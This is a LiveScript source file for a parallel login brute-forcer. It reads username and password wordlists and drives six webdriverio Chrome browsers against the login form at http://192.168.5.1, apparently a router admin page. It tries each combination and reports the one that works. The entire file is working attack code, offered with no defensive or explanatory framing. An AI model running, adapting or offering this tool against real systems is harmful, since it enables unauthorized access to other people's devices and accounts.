
require! {
  fs
  path
  colors
  webdriverio
  events
  bluebird: p
  helpers: h
  underscore: _
  }

  
options =
  desiredCapabilities:    
    browserName: 'chrome'


class Reader extends events.EventEmitter
  (filePath, options) ->
    defaults = {
      loop: false
    }
    
    @options = _.extend defaults, options
    @_filePath = path.normalize filePath
    
    @_lines = []
    @_requests = []
    
    @makeReadStream!

  makeReadStream: -> 
    @_fragment = ""

    @_stream = fs.createReadStream @_filePath
    @_stream.on 'error' -> throw it

    @_stream.on 'data', (data) ~>
      @_stream.pause!
      data = String(data).split(/(?:\n|\r\n|\r)/g)
      data[0] = @_fragment + data[0]

      if data.length > 0 then @_fragment = data.pop()
      else @_fragment = ""

      @_lines = @_lines.concat data
      if @_lines.length then @_stream.pause!; @emit 'push'

    @_stream.on 'end', ~>
      @_stream.removeAllListeners!
      #if @_fragment then @_lines.push @_fragment
      if @options.loop then
        @makeReadStream!
        @emit 'loop'
        @emit 'end'        
      else
        @emit 'end'
        _.map @_requests, ~>  it.reject new Error "reached the end of #{@_filePath}"
      
  work: ->
    @_working = true
    if @_stream.isPaused! then @_stream.resume!

    shift = ~> 
      @_requests.shift!.resolve @_lines.shift!
      if @_requests.length then @work!
      else @_working = false

    if @_lines.length then shift!
    else @once 'push', shift
    
  next: -> new p (resolve,reject) ~>
    if @_lines.length then resolve @_lines.shift!
    else
      @_requests.push { resolve: resolve, reject: reject }
      if not @_working then @work!

class BruteForcer
  (@userList, @passList) ->
    @ur = new Reader @userList
    @pr = new Reader @passList, loop: true

    @pr.on 'loop' ~> @user = void
    
    @requests = []
    
  getUser: -> new p (resolve,reject) ~>
    if @user then return resolve @user
    else @ur.next!then ~> resolve @user = it
    
  getPass: -> @pr.next!
  
  next: -> new p (resolve,reject) ~> 
    p.all([ @getUser!, @getPass! ]).then ->
      resolve user: it[0], pass: it[1]



bruteForcer = new BruteForcer 'user.txt', 'pass.txt'
 
workerN = 0

spawnWorker = ->
  n = workerN++
  page = webdriverio.remote(options).init!
  
  # check http://www.webdriver.io/api/ for api

  page.addCommand "bruteforce", (bruteForcer) ->
    loopy = ~> 
      bruteForcer.next!then (login) ~>  
        console.log "trying #{login.user}:#{login.pass}"
        @
          .waitForExist('.username', 3000)
          .setValue('.username', login.user)
          .setValue('.password', login.pass)
          .click('.login')
          .waitForExist('#myLayer', 3000)
          .then loopy, -> console.log colors.green "Worker #{n} finished with combo #{login.user} #{login.pass}"
    loopy!
      
  page
  .timeoutsImplicitWait(200)
  .url('http://192.168.5.1')
  .title (err, res) -> console.log('title: ' + res.value)
  .bruteforce bruteForcer
  .then (-> console.log "PASS", it), ((err) -> console.log "FAIL", err)

_.times 6, spawnWorker
